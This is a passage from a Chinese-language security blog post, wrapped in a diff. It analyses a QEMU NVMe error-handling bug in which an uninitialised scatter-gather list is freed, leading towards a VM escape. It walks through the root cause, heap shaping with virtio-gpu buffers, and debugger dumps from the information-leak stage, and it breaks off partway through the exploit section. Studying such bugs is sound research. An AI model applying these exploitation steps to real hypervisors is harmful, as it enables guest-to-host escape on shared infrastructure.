@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>QEMU-Misuse-ErrorHandling-Bug漏洞分析 | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="QEMU," />
+  
+
+  <meta name="description" content="QEMU漏洞分析">
+<meta name="keywords" content="QEMU">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QEMU-Misuse-ErrorHandling-Bug漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2021/05/24/ErrorHanlding分析/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="QEMU漏洞分析">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/QEMU-ErrorHandling分析/system初始.png">
+<meta property="og:image" content="http://yoursite.com/QEMU-ErrorHandling分析/clone前.png">
+<meta property="og:image" content="http://yoursite.com/QEMU-ErrorHandling分析/clone后.png">
+<meta property="og:updated_time" content="2022-01-09T15:00:13.306Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QEMU-Misuse-ErrorHandling-Bug漏洞分析">
+<meta name="twitter:description" content="QEMU漏洞分析">
+<meta name="twitter:image" content="http://yoursite.com/QEMU-ErrorHandling分析/system初始.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-TL-DR"><span class="toc-text">0x01 TL;DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Version"><span class="toc-text">0x02 Version</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Root-Case"><span class="toc-text">0x03 Root Case</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Exploit"><span class="toc-text">0x04 Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x41-Heap-Fengshui"><span class="toc-text">0x41 Heap Fengshui</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x42-Information-Leak"><span class="toc-text">0x42 Information Leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x43-System-Bash"><span class="toc-text">0x43 System Bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x44-Control-PC"><span class="toc-text">0x44 Control PC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Summary"><span class="toc-text">0x05 Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Some-Tricks"><span class="toc-text">0x06 Some Tricks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Reference"><span class="toc-text">0x08 Reference</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-ErrorHanlding分析" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">QEMU-Misuse-ErrorHandling-Bug漏洞分析</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2021.05.24</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="0x01-TL-DR"><a href="#0x01-TL-DR" class="headerlink" title="0x01 TL;DR"></a>0x01 TL;DR</h2><p>本文根据光年实验室在<code>BlackHat Asia2021</code>的议题<code>《Scavenger: Misuse Error Handling Leading to Qemu/KVM Escape》</code>进行了深入分析，具体内容在给出的<code>PPT</code>中已经说的比较清楚了，我这里就着重说一下我写利用过程当中遇到的一些难点和解决方法。</p>
+<h2 id="0x02-Version"><a href="#0x02-Version" class="headerlink" title="0x02 Version"></a>0x02 Version</h2><p>QEMU版本：4.2.1</p>
+<p>Host版本：Ubuntu 18.04.4 LTS</p>
+<p>Guest版本：Kernel 5.4.40</p>
+<h2 id="0x03-Root-Case"><a href="#0x03-Root-Case" class="headerlink" title="0x03 Root Case"></a>0x03 Root Case</h2><p>漏洞代码出现在<code>hw/block/nvme.c:nvme_dma_write_prp</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> uint16_t <span class="title">nvme_dma_write_prp</span><span class="params">(NvmeCtrl *n, <span class="keyword">uint8_t</span> *ptr, <span class="keyword">uint32_t</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint64_t</span> prp1, <span class="keyword">uint64_t</span> prp2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QEMUSGList qsg; <span class="comment">//未初始化qsg的内容</span></span><br><span class="line">    QEMUIOVector iov;</span><br><span class="line">    <span class="keyword">uint16_t</span> status = NVME_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nvme_map_prp(&amp;qsg, &amp;iov, prp1, prp2, len, n)) &#123;</span><br><span class="line">    		<span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint16_t <span class="title">nvme_map_prp</span><span class="params">(QEMUSGList *qsg, QEMUIOVector *iov, <span class="keyword">uint64_t</span> prp1,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint64_t</span> prp2, <span class="keyword">uint32_t</span> len, NvmeCtrl *n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hwaddr trans_len = n-&gt;page_size - (prp1 % n-&gt;page_size);</span><br><span class="line">    trans_len = MIN(len, trans_len);</span><br><span class="line">    <span class="keyword">int</span> num_prps = (len &gt;&gt; n-&gt;page_bits) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//......</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (n-&gt;cmbsz &amp;&amp; prp1 &gt;= n-&gt;ctrl_mem.addr &amp;&amp;</span><br><span class="line">               prp1 &lt; n-&gt;ctrl_mem.addr + int128_get64(n-&gt;ctrl_mem.size)) &#123;</span><br><span class="line">        qsg-&gt;nsg = <span class="number">0</span>;</span><br><span class="line">        qemu_iovec_init(iov, num_prps); <span class="comment">//初始化iov内存空间</span></span><br><span class="line">        qemu_iovec_add(iov, (<span class="keyword">void</span> *)&amp;n-&gt;cmbuf[prp1 - n-&gt;ctrl_mem.addr], trans_len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pci_dma_sglist_init(qsg, &amp;n-&gt;parent_obj, num_prps); <span class="comment">//初始化qsg内存空间</span></span><br><span class="line">        qemu_sglist_add(qsg, prp1, trans_len);</span><br><span class="line">    &#125;</span><br><span class="line">    len -= trans_len;</span><br><span class="line">    <span class="keyword">if</span> (len) &#123;</span><br><span class="line">        <span class="keyword">if</span> (unlikely(!prp2)) &#123;</span><br><span class="line">            trace_nvme_err_invalid_prp2_missing();</span><br><span class="line">            <span class="keyword">goto</span> unmap;</span><br><span class="line">        &#125;</span><br><span class="line">      	<span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line"> unmap:</span><br><span class="line">    qemu_sglist_destroy(qsg); <span class="comment">//回收qsg内存空间</span></span><br><span class="line">    <span class="keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以很明显的看出在<code>nvme_dma_write_prp</code>函数中并未初始化<code>qsg</code>。导致后续在<code>nvme_map_prp</code>函数中的错误处理（并未正确的处理<code>qsg</code>的空间释放）可以直接释放并未初始化的<code>qsg</code>空间，连续两个未初始化直接会造成<code>crash</code>。</p>
+<p>因为此处的<code>qsg</code>是被赋值了栈上的脏数据，因此后续被<code>free</code>时会造成崩溃。</p>
+<h2 id="0x04-Exploit"><a href="#0x04-Exploit" class="headerlink" title="0x04 Exploit"></a>0x04 Exploit</h2><p>回到前面所说的例子，<code>qsg</code>可被栈上的数据控制，但是我们无法控制栈上的脏数据，因此这条路行不通。看下面这个函数<code>hw/block/nvme.c:nvme_rw</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> uint16_t <span class="title">nvme_rw</span><span class="params">(NvmeCtrl *n, NvmeNamespace *ns, NvmeCmd *cmd,</span></span></span><br><span class="line"><span class="function"><span class="params">    NvmeRequest *req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nvme_map_prp(&amp;req-&gt;qsg, &amp;req-&gt;iov, prp1, prp2, data_size, n)) &#123;</span><br><span class="line">      	<span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nvme_init_sq</span><span class="params">(NvmeSQueue *sq, NvmeCtrl *n, <span class="keyword">uint64_t</span> dma_addr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint16_t</span> sqid, <span class="keyword">uint16_t</span> cqid, <span class="keyword">uint16_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    NvmeCQueue *cq;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//......</span></span><br><span class="line">    sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size); <span class="comment">// 申请req，NvmeRequest结构体size为0xa0</span></span><br><span class="line"></span><br><span class="line">    QTAILQ_INIT(&amp;sq-&gt;req_list);</span><br><span class="line">    QTAILQ_INIT(&amp;sq-&gt;out_req_list);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sq-&gt;size; i++) &#123;</span><br><span class="line">        sq-&gt;io_req[i].sq = sq;</span><br><span class="line">        QTAILQ_INSERT_TAIL(&amp;(sq-&gt;req_list), &amp;sq-&gt;io_req[i], entry);</span><br><span class="line">    &#125;</span><br><span class="line">    sq-&gt;timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, nvme_process_sq, sq);</span><br><span class="line">		<span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>nvme_rw</code>函数中传入的<code>qsg</code>是在<code>nvme_init_sq</code>函数中<code>g_new()</code>得来的，也就是在堆中，那么这里我们很有可能可以控制<code>qsg</code>的内容。接下来我们就需要在<code>QEMU</code>中寻找满足相应的填充堆块：</p>
+<ol>
+<li>堆块<code>size</code>必须为<code>0xa0*n</code></li>
+<li>堆块内容可控，且在<code>0x40</code>的<code>offset</code>处(<code>req-&gt;qsg</code>)也需要有我们能控制的<code>object</code>指针</li>
+</ol>
+<p>在作者的<code>PPT</code>当中并没有找到合适的填充堆块，提到在<code>xhci</code>设备中有一些感兴趣的堆块，但是并不在同一线程的堆块中。我猜测作者所说的应该是这一块：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> XHCITransfer *<span class="title">xhci_ep_alloc_xfer</span><span class="params">(XHCIEPContext *epctx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">uint32_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> limit = epctx-&gt;nr_pstreams + <span class="number">16</span>;</span><br><span class="line">    XHCITransfer *xfer;</span><br><span class="line"></span><br><span class="line">    xfer = g_new0(XHCITransfer, <span class="number">1</span>); <span class="comment">// XHCITransfer-&gt;packet-&gt;iov-&gt;iov_base</span></span><br><span class="line">		<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> xfer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是随后作者在<code>virtio-gpu</code>设备中找到了比较好的填充堆块<code>hw/display/virtio-gpu.c:virtio_gpu_create_mapping_iov</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">virtio_gpu_create_mapping_iov</span><span class="params">(VirtIOGPU *g,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  struct virtio_gpu_resource_attach_backing *ab,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  struct virtio_gpu_ctrl_command *cmd,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">uint64_t</span> **addr, struct iovec **iov)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_gpu_mem_entry</span> *<span class="title">ents</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> esize, s;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    esize = <span class="keyword">sizeof</span>(*ents) * ab-&gt;nr_entries;</span><br><span class="line">    ents = g_malloc(esize);</span><br><span class="line">    s = iov_to_buf(cmd-&gt;elem.out_sg, cmd-&gt;elem.out_num,</span><br><span class="line">                   <span class="keyword">sizeof</span>(*ab), ents, esize);</span><br><span class="line"></span><br><span class="line">    *iov = g_malloc0(<span class="keyword">sizeof</span>(struct iovec) * ab-&gt;nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (addr) &#123;</span><br><span class="line">        *addr = g_malloc0(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>) * ab-&gt;nr_entries);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ab-&gt;nr_entries; i++) &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> a = le64_to_cpu(ents[i].addr);</span><br><span class="line">        <span class="keyword">uint32_t</span> l = le32_to_cpu(ents[i].length);</span><br><span class="line">        hwaddr len = l;</span><br><span class="line">        (*iov)[i].iov_len = l;</span><br><span class="line">        (*iov)[i].iov_base = dma_memory_map(VIRTIO_DEVICE(g)-&gt;dma_as,</span><br><span class="line">                                            a, &amp;len, DMA_DIRECTION_TO_DEVICE); <span class="comment">//可控堆块内容</span></span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> // <span class="title">size</span> = 0<span class="title">x10</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *iov_base;	<span class="comment">/* Pointer to data.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> iov_len;	<span class="comment">/* Length of data.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+<p>在偏移<code>0x40</code>处是<code>iov-&gt;iov_base</code>，根据上面代码可以看到此处的内容是<code>dma_memory_map</code>的映射地址，也就是说我们在<code>guest</code>空间可以访问到。因此这里我们完全可控，可以利用这块地址做<code>UAF</code>。(越看越有<code>CTF</code>堆题的味道了…)</p>
+<h3 id="0x41-Heap-Fengshui"><a href="#0x41-Heap-Fengshui" class="headerlink" title="0x41 Heap Fengshui"></a>0x41 Heap Fengshui</h3><p>在正式开始利用之前我们需要布局好比较稳定的堆块空间。因为我们需要保证在前期构造堆块后务必让<code>nvme</code>中的<code>NvmeRequest</code>能够申请到我们所构造的堆块。</p>
+<p>这里我们利用<code>nvme</code>设备中的<code>malloc</code>操作函数来构造堆申请原语：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nvme_init_sq</span><span class="params">(NvmeSQueue *sq, NvmeCtrl *n, <span class="keyword">uint64_t</span> dma_addr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint16_t</span> sqid, <span class="keyword">uint16_t</span> cqid, <span class="keyword">uint16_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    NvmeCQueue *cq;</span><br><span class="line"></span><br><span class="line">    sq-&gt;cqid = cqid;</span><br><span class="line">    sq-&gt;head = sq-&gt;tail = <span class="number">0</span>;</span><br><span class="line">    sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size); <span class="comment">//堆申请原语</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对于具体堆块<code>size</code>就根据自己构造的堆块<code>size</code>来改变。我后续需要用到<code>0x290</code>大小的堆块（包含<code>head</code>），这里就采用<code>sq-&gt;size=4</code>来进行堆喷。</p>
+<h3 id="0x42-Information-Leak"><a href="#0x42-Information-Leak" class="headerlink" title="0x42 Information Leak"></a>0x42 Information Leak</h3><p>首先在<code>virtio-gpu</code>中构造好一个<code>0x290 size</code>的<code>tcache bin</code>。</p>
+<p>具体堆布局如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line"><span class="number">0x280</span> [  <span class="number">1</span>]: <span class="number">0x555557570210</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x290</span> [  <span class="number">2</span>]: <span class="number">0x5555571418a0</span> —▸ <span class="number">0x55555798e800</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>堆块内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x5555571418a0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555557141890</span>:	<span class="number">0x0000000000000040</span>	<span class="number">0x0000000000000290</span></span><br><span class="line"><span class="number">0x5555571418a0</span>:	<span class="number">0x000055555798e800</span>	<span class="number">0x00005555567f5010</span></span><br><span class="line"><span class="number">0x5555571418b0</span>:	<span class="number">0x0000000139f1c010</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5555571418c0</span>:	<span class="number">0x0000000139f1c020</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5555571418d0</span>:	<span class="number">0x0000000139f1c030</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5555571418e0</span>:	<span class="number">0x0000000139f1c040</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5555571418f0</span>:	<span class="number">0x0000000139f1c050</span>	<span class="number">0x0000000000000000</span> <span class="comment">//此处必须为0</span></span><br><span class="line"><span class="number">0x555557141900</span>:	<span class="number">0x0000000139f1c060</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x555557141910</span>:	<span class="number">0x0000000139f1c070</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x555557141920</span>:	<span class="number">0x0000000139f1c080</span>	<span class="number">0x0000000000000100</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555798e800</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x55555798e7f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x55555798e800</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00005555567f5010</span></span><br><span class="line"><span class="number">0x55555798e810</span>:	<span class="number">0x00007fffa1d1c010</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x55555798e820</span>:	<span class="number">0x00007fffa1d1c020</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x55555798e830</span>:	<span class="number">0x00007fffa1d1c030</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x55555798e840</span>:	<span class="number">0x00007fffa1d1c040</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x55555798e850</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> <span class="comment">//dev</span></span><br><span class="line"><span class="number">0x55555798e860</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55555798e870</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55555798e880</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>地址<code>0x55555798e840</code>处就是后续<code>qsg</code>的位置。</p>
+<p>往后就利用<code>nvme</code>中的申请未初始化堆块来填充<code>NvmeRequest</code>内容。</p>
+<p><strong>这里需要注意的一个点</strong>就是地址<code>0x55555798e858</code>处，这里后续是<code>qsg-&gt;dev</code>。在<code>qemu_sglist_destroy</code>函数中有这样一段：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qemu_sglist_destroy</span><span class="params">(QEMUSGList *qsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    object_unref(OBJECT(qsg-&gt;dev)); <span class="comment">//（1）</span></span><br><span class="line">    g_free(qsg-&gt;sg);</span><br><span class="line">    <span class="built_in">memset</span>(qsg, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qsg));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">object_unref</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!obj) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g_assert(obj-&gt;ref &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以必须是使得<code>qsg-dev</code>的值为<code>0</code>才能<code>pass</code>检查。</p>
+<p>最后在未初始化<code>free</code>的<code>qemu_sglist_destroy(qsg)</code>可以看到如下的情况，正好分配到了我们构造的堆块中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *qsg</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  sg = <span class="number">0x7fffa1d43040</span>,</span><br><span class="line">  nsg = <span class="number">0</span>,</span><br><span class="line">  nalloc = <span class="number">0</span>,</span><br><span class="line">  size = <span class="number">0</span>,</span><br><span class="line">  dev = <span class="number">0x0</span>,</span><br><span class="line">  as = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p qsg</span><br><span class="line">$<span class="number">3</span> = (QEMUSGList *) <span class="number">0x55555798e840</span></span><br></pre></td></tr></table></figure>
+<p><code>free</code>后：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line"><span class="number">0x280</span> [  <span class="number">1</span>]: <span class="number">0x555557570210</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x290</span> [  <span class="number">1</span>]: <span class="number">0x7fffa1d43040</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>堆块情况：</p>
